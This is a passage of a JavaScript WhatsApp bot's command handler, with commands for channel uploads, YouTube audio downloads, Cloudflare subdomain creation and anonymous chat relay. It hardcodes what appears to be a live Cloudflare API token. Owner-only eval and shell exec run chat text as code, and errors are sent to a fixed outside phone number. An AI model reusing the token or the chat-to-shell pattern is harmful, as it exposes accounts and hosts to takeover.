newsletterName: '❃ RafatharCode - Assistant'
}, externalAdReply: {
title: ngawi, 
body: jomokck,
thumbnailUrl: "https://telegra.ph/file/2324daab2ea7ce51596fa.jpg", 
sourceUrl: null,
mediaType: 1
}, }}) 
rafatharcode.sendMessage(`${global.idch}`,{audio: await quoted.download(), mimetype: 'audio/mp4', ptt: true})
await sleep(2000)
rafatharcode.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
break

case 'upch-img':{
 if (!isOwner) return onlyOwn()
if (!/image/.test(mime)) return rafatharcodereply(`Use ${prefix+command} Contoh Gambar Caption|Caption\nExample ${prefix+command} Caption | Caption`) 
 rafatharcode.sendMessage(`${global.idch}`, { react: { text: '🕐', key: m.key }})
 ngawi = text.split("|")[0]
 jomokck = text.split("|")[1]
 await sleep(6000)
rafatharcode.sendMessage(m.chat,{image: await quoted.download(),mimetype: 'image/png',ptt: true,
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: '120363318521671268@newsletter',
serverMessageId: 20,
newsletterName: '❃ RafatharCode - Assistant'
}, externalAdReply: {
title: ngawi, 
body: jomokck,
thumbnailUrl: "https://telegra.ph/file/2324daab2ea7ce51596fa.jpg", 
sourceUrl: null,
mediaType: 1
}, }}) 
rafatharcode.sendMessage(`${global.idch}`,{image: await quoted.download(), mimetype: 'image/png', ptt: true})
await sleep(2000)
rafatharcode.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
break

case 'play-v2': {
if (!isOwner) return onlyOwn()
 if (!text) return rafatharcodereply('Example: Masih hatiku');
 rafatharcodereply('_Waittt Sedang Kami Proses..._')
 try {
let search = require("yt-search");
let { youtube } = require("btch-downloader");
 const look = await search(text);
 const convert = look.videos[0];
 if (!convert) return reply('Video/Audio Tidak Ditemukan');
 if (convert.seconds >= 3600) {
 return reply(m.chat, 'Video is longer than 1 hour!');
 } else {
 let audioUrl;
 try {
 audioUrl = await youtube(convert.url);
 } catch (e) {
 reply(mess.wait)
 audioUrl = await youtube(convert.url);
 }

 await rafatharcode.sendMessage(m.chat, {
 audio: {
 url: audioUrl.mp3
 },
 mimetype: 'audio/mpeg',
 contextInfo: {
 externalAdReply: {
 title: convert.title,
 body: "",
 thumbnailUrl: convert.image,
 sourceUrl: audioUrl.mp3,
 mediaType: 1,
 showAdAttribution: true,
 renderLargerThumbnail: true
 }
 }
 }, {
 quoted: m
 });
 }
 } catch (e) {
 reply(m.chat, `*Error:* ` + e.message);
 }
};
break

case 'domain42': {
 if (!isOwner) return onlyOwn()
 function subDomain1(host, ip) {
 return new Promise((resolve) => {
 let zone = "a859742b5cbca42c7c07ac934f6f9868";
 let apitoken = "m1Fo5Oc5txDCT37ALYdIpd6gMyQA80s6yvI-hkwO";
 let tld = "panelll.web.id";
 axios
 .post(
 `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
 { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
 {
 headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
 },
 }
 )
 .then((e) => {
 let res = e.data;
 if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
 })
 .catch((e) => {
 let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
 let err1Str = String(err1);
 resolve({ success: false, error: err1Str });
 });
 });
 }
 
 let raw1 = args?.join(" ")?.trim();
 if (!raw1) return reply("mana host & ip nya?");
 let host1 = raw1
 .split("|")[0]
 .trim()
 .replace(/[^a-z0-9.-]/gi, "");
 if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
 let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
 if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
 
 subDomain1(host1, ip1).then((e) => {
 if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
 else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
 }); }
 
 
 break

default:

if ((budy) && [`${db.data.users[m.sender].otp}`].includes(budy) && !m.fromMe) {
if (db.data.users[m.sender].daftar) return m.reply(`Kamu sudah terdaftar!`)
const srlnye = createSerial(5)
var angka = await randomNomor(20, 700)
m.reply(`*Berhasil mendaftar!*\n\n${monospace("INFORMASI  AKUN")}\nNama: Player-${angka}\nID: ${m.sender.split('@')[0]}\nSerial: ${srlnye}`)
db.data.users[m.sender].daftar = true
db.data.users[m.sender].nama = `Player-${angka}`
db.data.users[m.sender].otp = `${db.data.users[m.sender].otp}`
db.data.users[m.sender].email = `${db.data.users[m.sender].email}`
db.data.users[m.sender].serial = `${srlnye}`
addRegisteredUser(m.sender, `Player-${angka}`, srlnye)
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(start|leave|next)/.test(m.text)) return
if (['.start','.leave','.next','.mulai','.keluar','.lanjut','.skip'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
}:{})
}
return !0
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
this.menfes = this.menfes ? this.menfes : {}
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(start|leave|next)/.test(m.text)) return
if (['.start','.leave','.next','.mulai','.keluar','.lanjut','.skip'].includes(m.text)) return
find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
let other = find.a == m.sender ? find.b : find.a
await m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
participant: other
}
}:{})
}
}

if (budy.startsWith('=> ')) {
if (!isOwner) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(util.format(e))
}}

if (budy.startsWith('> ')) {
if (!isOwner) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(util.format(err))
}}
}

if (budy.startsWith('$ ')) {
if (!isOwner) return 
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})}
}

catch (err) {
console.log(util.format(err))
let e = String(err)
rafatharcode.sendMessage("6283183432282@s.whatsapp.net", {text: "Hi developer, tolong perbaiki beberapa ini\n\n" + util.format(err)})
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
